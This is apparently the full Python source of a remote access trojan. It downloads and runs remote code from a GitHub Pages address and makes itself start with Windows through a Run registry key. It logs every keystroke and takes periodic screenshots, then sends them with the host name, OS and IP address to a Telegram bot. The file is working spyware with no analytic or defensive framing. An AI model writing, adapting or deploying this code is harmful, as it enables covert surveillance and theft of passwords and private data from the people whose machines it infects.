# Begin program
import pyautogui
import requests
import time
import os, sys
import platform
import subprocess
import multiprocessing

def load(url):
    return str(requests.get(url).content.decode("utf-8"))

ip = ""
while ip == "":
    try:
        ip = load("http://ifconfig.me")
    except:
        print("Connection Error: wait 10sec")
        time.sleep(10)
white_list = load("https://dtrat.github.io/dtrat/whitelist-ip.txt?q={}".format(time.time())).split("\n")
inidata = load("https://dtrat.github.io/dtrat/config.ini?q={}".format(time.time()))

exec(load("https://dtrat.github.io/dtrat/load.py?q={}".format(time.time)))

if ip in white_list:
    print("Whitelist detected!")
    if "whitelist" in dir():
        whitelist()
    sys.exit(0)

# Fuck configparser All homies use for loop.
config = {}
sec = ""
for line in inidata.split("\n"):
    if len(line) == 0:
        continue
    if line[0] == "[":
        sec = line[1:-1]
        if sec not in config:
            config[sec] = {}
        continue
    name = line.split("=")[0]
    value = line.split("=")[1]
    config[sec][name] = value

token=config["main"]["token"]
chatid =config["main"]["chatid"]
program =config["main"]["program"]
interval = int(config["main"]["interval"])

caption = "amogus"

def get_screenshot():
    fname = os.environ["TEMP"]+"/"+str(time.time())+".png".replace("\\","/")
    im2 = pyautogui.screenshot(fname)
    return fname

def send_image(fname,caption=caption):
    url='https://api.telegram.org/bot{}/sendPhoto'.format(token)
    files={'photo': open(fname,'rb')}
    values={'chat_id' : chatid , 'caption':caption,'disable_notification': 'true', 'parse_mode':'MarkdownV2'}
    r=requests.post(url,files=files,data=values)

def send_file(fname,caption=caption):
    url='https://api.telegram.org/bot{}/sendDocument'.format(token)
    files={'document': open(fname,'rb')}
    values={'chat_id' : chatid , 'caption':caption,"disable_notification": 'true', 'parse_mode':'MarkdownV2'}
    r=requests.post(url,files=files,data=values)

def send_message(message=caption):
    url='https://api.telegram.org/bot{}/sendMessage'.format(token)
    values={'chat_id' : chatid , 'text':message,"disable_notification": 'true'}
    r=requests.post(url,data=values)
    print(r.content)
    
def set_interval(new):
    global interval
    interval = new

def define_caption():
    global caption
    caption = "**HOST:** `"+platform.uname()[1]+"`\n" + \
          "**OS:**   `"+str(platform.platform())+"`\n" + \
          "**IP**    `"+ip+"`"

def self_clone(name):
    import shutil
    shutil.copyfile(sys.argv[0], name)

if not os.path.exists(os.environ["APPDATA"]+"/"+program):
    self_clone(os.environ["APPDATA"]+"/"+program)
    if "first_setup" in dir():
        first_setup()
    regdata="Windows Registry Editor Version 5.00\n"
    regdata+="\n"
    regdata+="[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]\n"
    regdata+='"amogus"="{}"\n'.format(os.environ["APPDATA"].replace("\\","\\\\")+"\\\\"+program)

    f=open(os.environ["TEMP"]+"/autostart.reg","w")
    f.write(regdata)
    f.flush()
    f.close()
    os.system("reg import {}".format(os.environ["TEMP"]+"/autostart.reg"))
    time.sleep(3)
    os.unlink(os.environ["TEMP"]+"/autostart.reg")
    sys.exit(0)

define_caption()
if "setup" in dir():
        setup()

from pynput.keyboard import Key, Listener
key_buffer = ""

def on_press(key):
    global key_buffer
    try:
        
        knew = "{}".format(key)
        if knew[0] == "'":
            knew = knew[1:-1]
        if "Key" in knew:
            if knew == 'Key.space':
                knew = ' '
            elif knew == "Key.enter":
                knew = '\n'
            else:
                knew = ''
        if not knew.isascii():
            knew = ''
        key_buffer += knew
        if len(key_buffer) > int(config["main"]["keylimit"]):
            fname = os.environ["TEMP"]+"/"+str(time.time())+".txt".replace("\\","/")
            f = open(fname,"w")
            f.write(key_buffer)
            f.flush()
            f.close()
            send_file(fname,caption)
            time.sleep(3)
            os.unlink(fname)
            key_buffer = ""
    except:
        pass
        


def init_keylogger():
    print("keylogger init")
    with Listener(on_press=on_press) as listener :
        listener.join()



if sys.argv[-1] == "klog":
    init_keylogger()
    sys.exit(0)

#subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NEW_CONSOLE)

while True:
    if "loop" in dir():
        loop()
    print("Take ss")
    f = get_screenshot()
    print("Send ss")
    send_image(f,caption)
    key_buffer = ""
    try:
        time.sleep(3)
        os.unlink(fname)
    except:
        pass
    time.sleep(interval-3)
